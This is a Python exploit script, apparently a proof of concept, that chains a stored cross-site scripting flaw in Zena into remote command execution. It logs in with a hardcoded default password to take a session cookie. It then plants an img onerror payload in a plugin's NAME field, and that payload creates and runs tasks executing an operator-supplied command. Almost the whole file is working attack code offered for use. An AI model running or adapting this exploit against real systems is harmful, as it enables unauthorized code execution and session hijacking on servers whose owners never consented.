# Zena XSS to RCE exploit. Exploit is reliant on a credential cookie theft to perform RCE component.

import os
import sys
import json
import requests


class CookieMonster:

    def __init__(self, host, port, tls, cmd):
        if tls is True:
            self.host = "https://" + host + ":" + port
        else:
            self.host = "http://" + host + ":" + port
        self.cmd = cmd
        self.webConfigLogin = ["GET", "/oc_main/cm/clientManager/login?pwd=zena"]
        self.webConfigPlugin = ["PUT", "/oc_main/cm/zenaPlugins"]
        self.clientMgrCreateTsk = ["POST", "/oc_main/zenaweb/definitions"]
        self.clientMgrExecTsk = ["POST", ""]
        self.getUsers = ["GET", "/oc_main/zenaweb/definitions/logins"]
        self.getAgents = ["GET", "/oc_main/zenaweb/agents"]
        self.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"

    def controller(self):
        sessionID = self.login()
        self.XSS(sessionID)

    def login(self):

        headers = {
            "Host": self.host,
            "User-Agent": self.userAgent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "close",
            "Referer": self.host + "/webconfig/index.html"
        }
        req = requests.get(self.host + self.webConfigLogin[1], headers=headers)
        responseHeaders = json.dumps(dict(req.headers))
        responseHeaders = json.loads(responseHeaders)
        jsessionID = responseHeaders["Set-Cookie"].split(";")[0]

        return jsessionID   # To be used for malicious connector creation


    def XSS(self, sessionID):

        payload = {
            "NAME": "</li><img/src='fail'/onerror=\"" + self.jsPayload() + "\"></img>",
            "DB_URL": "http://test.com",
            "DB_USER": "test",
            "DB_TYPE": "MSSQL",
            "DB_DRIVER": "com.microsoft.sqlserver.jdbc.SQLServerDriver",
            "DB_PASSWORD": "test",
            "DESCRIPTION": "test",
            "ENABLED": "true"
        }

        headers = {
            "Host": self.host,
            "User-Agent": self.userAgent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Length": str(sys.getsizeof(payload)),
            "Connection": "close",
            "Referer": self.host + "/webconfig/index.html",
            "Cookie": sessionID
        }

        print("[+] Starting XSS..")
        req = requests.put(self.host + self.webConfigPlugin[1], data=json.dumps(payload), headers=headers)
        response = str(req.content)
        if "true" in response:
            print("[+] Payload Successfully Delivered!")

    def jsPayload(self):

        # Replace JS Placeholders with payload data
        payload = open(os.path.realpath("payload-js.txt"), "r").read()
        payload = payload.replace("<USERS_METHOD>", self.getUsers[0])
        payload = payload.replace("<USERS_HOST>", self.getUsers[1])
        payload = payload.replace("<AGENTS_METHOD>", self.getAgents[0])
        payload = payload.replace("<AGENTS_HOST>", self.getAgents[1])
        payload = payload.replace("<CREATE_METHOD>", self.clientMgrCreateTsk[0])
        payload = payload.replace("<CREATE_HOST>", self.host + self.clientMgrCreateTsk[1])
        payload = payload.replace("<EXEC_METHOD>", self.clientMgrExecTsk[0])
        payload = payload.replace("<EXEC_HOST>", self.host)
        payload = payload.replace("<COMMAND_PAYLOAD>", self.cmd)

        return payload


if __name__ == '__main__':
    # Args
    host = str(sys.argv[1])
    port = str(sys.argv[2])
    tls = str(sys.argv[3])
    cmd = str(sys.argv[4])
    # Exec
    CookieMonster(host, port, tls, cmd).controller()
